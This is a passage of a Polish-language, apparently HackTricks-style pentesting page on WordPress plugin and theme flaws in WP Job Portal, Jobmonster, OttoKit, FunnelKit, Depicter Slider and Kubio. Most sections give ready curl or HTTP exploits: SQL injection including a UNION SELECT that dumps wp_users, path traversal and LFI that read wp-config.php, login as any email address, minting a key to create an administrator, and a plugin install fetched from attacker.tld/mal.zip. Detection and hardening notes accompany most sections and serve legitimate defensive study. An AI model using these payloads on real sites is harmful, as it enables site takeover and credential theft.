#### Wykorzystanie

1. Pobierz świeży nonce:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Wstrzyknięcie dowolnego zapytania SQL przez nadużycie `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
Odpowiedź ujawnia wynik wstrzykniętego zapytania lub modyfikuje bazę danych, potwierdzając SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Inne zadanie, **downloadcustomfile**, pozwalało odwiedzającym pobrać **dowolny plik na dysku** poprzez path traversal. Wrażliwy sink znajduje się w `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` jest kontrolowany przez atakującego i konkatenowany **bez sanitacji**. Ponownie, jedyną barierą jest **CSRF nonce**, który można pobrać ze strony z CV.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Serwer zwraca zawartość `wp-config.php`, leaking DB credentials and auth keys.

## Nieautoryzowane przejęcie konta przez Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

Wiele motywów/pluginów dostarcza "social login" helpery wystawione przez admin-ajax.php. Jeśli nieautoryzowana akcja AJAX (wp_ajax_nopriv_...) ufa identyfikatorom dostarczonym przez klienta, gdy brakuje danych providera, a następnie wywołuje wp_set_auth_cookie(), to staje się to pełnym obejściem uwierzytelniania.

Typowy błędny schemat (uproszczony)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider – execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // 🔥 logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
Dlaczego to jest eksploatowalne

- Dostęp bez uwierzytelnienia przez admin-ajax.php (akcja wp_ajax_nopriv_…).
- Brak sprawdzeń nonce/capability przed zmianą stanu.
- Brak weryfikacji dostawcy OAuth/OpenID; gałąź domyślna akceptuje dane od atakującego.
- get_user_by('email', $_POST['id']) z następującym wp_set_auth_cookie($uid) uwierzytelnia żądającego jako dowolny istniejący adres e-mail.

Eksploatacja (bez uwierzytelnienia)

- Wymagania wstępne: atakujący może osiągnąć /wp-admin/admin-ajax.php i zna/zgaduje poprawny adres e-mail użytkownika.
- Ustaw provider na nieobsługiwaną wartość (lub pomiń go), aby trafić do gałęzi domyślnej i przekazać id=<victim_email>.
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Expected success indicators

- HTTP 200 z ciałem JSON takim jak {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* dla ofiary; kolejne żądania są uwierzytelnione.

Finding the action name

- Sprawdź motyw/wtyczkę pod kątem rejestracji add_action('wp_ajax_nopriv_...', '...') w kodzie social login (np. framework/add-ons/social-login/class-social-login.php).
- Grep for wp_set_auth_cookie(), get_user_by('email', ...) inside AJAX handlers.

Detection checklist

- Logi serwera pokazujące niezautoryzowane żądania POST do /wp-admin/admin-ajax.php z akcją social-login i id=<email>.
- Odpowiedzi 200 z JSON-em sukcesu bezpośrednio poprzedzające uwierzytelniony ruch z tego samego IP/User-Agent.

Hardening

- Nie wyprowadzaj tożsamości na podstawie danych przesłanych przez klienta. Akceptuj tylko adresy e-mail/ID pochodzące z zatwierdzonego tokena/ID dostawcy.
- Wymagaj nonce CSRF i sprawdzeń uprawnień nawet dla helperów logowania; unikaj rejestrowania wp_ajax_nopriv_ chyba że jest to absolutnie konieczne.
- Waliduj i weryfikuj odpowiedzi OAuth/OIDC po stronie serwera; odrzucaj brakujących/nieprawidłowych dostawców (bez fallbacku do POST id).
- Rozważ tymczasowe wyłączenie social login lub wirtualne załatanie na edge (zablokowanie podatnej akcji) do czasu naprawy.

Patched behaviour (Jobmonster 4.8.0)

- Usunięto niebezpieczny fallback oparty na $_POST['id']; $user_email musi pochodzić z gałęzi zweryfikowanego dostawcy w switch($_POST['using']).

## Unauthenticated privilege escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers ≤ 1.0.82)

Niektóre wtyczki udostępniają endpointy REST, które tworzą wielokrotnego użytku “connection keys” lub tokeny bez weryfikacji uprawnień wywołującego. Jeśli trasa autoryzuje się jedynie na podstawie odgadniętego atrybutu (np. username) i nie wiąże klucza z użytkownikiem/sesją poprzez sprawdzenia uprawnień, każdy niezalogowany atakujący może wygenerować klucz i wywołać uprzywilejowane akcje (utworzenie konta admina, akcje wtyczki → RCE).

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: full takeover by chaining the minted key to internal privileged actions

PoC – wygeneruj connection key i użyj go
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# → {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
Dlaczego to jest podatne
- Wrażliwa ścieżka REST chroniona jedynie przez dowód tożsamości o niskiej entropii (username) lub brakujący permission_callback
- Brak egzekwowania capability; wygenerowany klucz jest akceptowany jako uniwersalny bypass

Lista kontrolna wykrywania
- Grep w kodzie wtyczki w poszukiwaniu register_rest_route(..., [ 'permission_callback' => '__return_true' ])
- Każda ścieżka, która wydaje tokeny/klucze na podstawie tożsamości dostarczonej w żądaniu (username/email) bez powiązania z uwierzytelnionym użytkownikiem lub capability
- Szukaj kolejnych ścieżek, które akceptują wygenerowany token/klucz bez serwerowego sprawdzenia capability

Wzmocnienie
- Dla każdej uprzywilejowanej ścieżki REST: wymagaj permission_callback, który egzekwuje current_user_can() dla wymaganej capability
- Nie twórz długowiecznych kluczy na podstawie tożsamości dostarczonej przez klienta; jeśli to konieczne, wydawaj krótkotrwałe, powiązane z użytkownikiem tokeny po uwierzytelnieniu i ponownie sprawdzaj capability podczas użycia
- Zwaliduj kontekst użytkownika wywołującego (wp_set_current_user nie jest wystarczające samo w sobie) i odrzucaj żądania, gdzie !is_user_logged_in() || !current_user_can(<cap>)

---

## Nonce gate misuse → unauthenticated arbitrary plugin installation (FunnelKit Automations ≤ 3.5.3)

Nonces zapobiegają CSRF, nie autoryzacji. Jeśli kod traktuje pozytywne przejście nonce jako zielone światło i następnie pomija sprawdzenia capability dla operacji uprzywilejowanych (np. install/activate plugins), niezalogowani atakujący mogą spełnić słabe wymaganie nonce i osiągnąć RCE przez zainstalowanie backdoored or vulnerable plugin.

- Vulnerable path: plugin/install_and_activate
- Flaw: weak nonce hash check; no current_user_can('install_plugins'|'activate_plugins') once nonce “passes”
- Impact: full compromise via arbitrary plugin install/activation

PoC (shape depends on plugin; illustrative only)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
Detection checklist
- REST/AJAX handlers modyfikujące wtyczki/motywy używające jedynie wp_verify_nonce()/check_admin_referer() i bez sprawdzenia uprawnień
- Każda ścieżka kodu, która ustawia $skip_caps = true po walidacji nonce

Hardening
- Zawsze traktuj nonces wyłącznie jako tokeny CSRF; wymuszaj sprawdzenia uprawnień niezależnie od stanu nonce
- Wymagaj current_user_can('install_plugins') oraz current_user_can('activate_plugins') przed dotarciem do kodu instalatora
- Odrzucaj nieuwierzytelniony dostęp; unikaj udostępniania nopriv AJAX actions dla uprzywilejowanych przepływów

---

## Niezalogowany SQLi via s search parameter in depicter-* actions (Depicter Slider ≤ 3.6.1)

Wiele akcji depicter-* wykorzystywało parametr s (search) i konkatenowało go w zapytaniach SQL bez parametryzacji.

- Parameter: s (search)
- Flaw: bezpośrednia konkatenacja łańcuchów w klauzulach WHERE/LIKE; brak użycia zapytań przygotowanych i sanitizacji
- Impact: eksfiltracja bazy danych (użytkownicy, hashe), lateral movement

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
Detection checklist
- Przeszukaj (grep) depicter-* action handlers oraz bezpośrednie użycie $_GET['s'] lub $_POST['s'] w SQL
- Przejrzyj niestandardowe zapytania przekazywane do $wpdb->get_results()/query(), łączące s

Hardening
- Zawsze używaj $wpdb->prepare() lub wpdb placeholders; odrzucaj nieoczekiwane metaznaki po stronie serwera
- Dodaj ścisłą białą listę dla s i normalizuj do oczekiwanego zestawu znaków/długości

---

## Unauthenticated Local File Inclusion via niezwalidowanej ścieżki szablonu/pliku (Kubio AI Page Builder ≤ 2.5.1)

Akceptowanie ścieżek kontrolowanych przez atakującego w parametrze template bez normalizacji/izolacji pozwala na odczyt dowolnych lokalnych plików, a czasami na wykonanie kodu, jeśli pliki PHP/log możliwe do include zostaną załadowane w czasie wykonywania.

- Parameter: __kubio-site-edit-iframe-classic-template
- Flaw: brak normalizacji/białej listy; traversal permitted
- Impact: ujawnienie sekretów (wp-config.php), potencjalne RCE w określonych środowiskach (log poisoning, includable PHP)

PoC – read wp-config.php
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
Lista kontrolna wykrywania
- Każdy handler łączący ścieżki żądań i przekazujący je do include()/require()/read sinks bez kontroli za pomocą realpath()
- Szukaj wzorców traversal (../), które prowadzą poza zamierzony katalog szablonów

Wzmocnienie zabezpieczeń
- Wymuś listę dozwolonych (allowlisted) szablonów; rozwiąż ścieżki przez realpath() i sprawdź str_starts_with(realpath(file), realpath(allowed_base))
- Normalizuj wejście; odrzucaj sekwencje traversal i ścieżki bezwzględne; używaj sanitize_file_name() tylko dla nazw plików (nie pełnych ścieżek)


## Źródła

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset – delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ≤ 5.6.1 – Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation – Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025’s most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) ≤ 1.0.82 – Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations ≤ 3.5.3 – Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider ≤ 3.6.1 – Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder ≤ 2.5.1 – Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
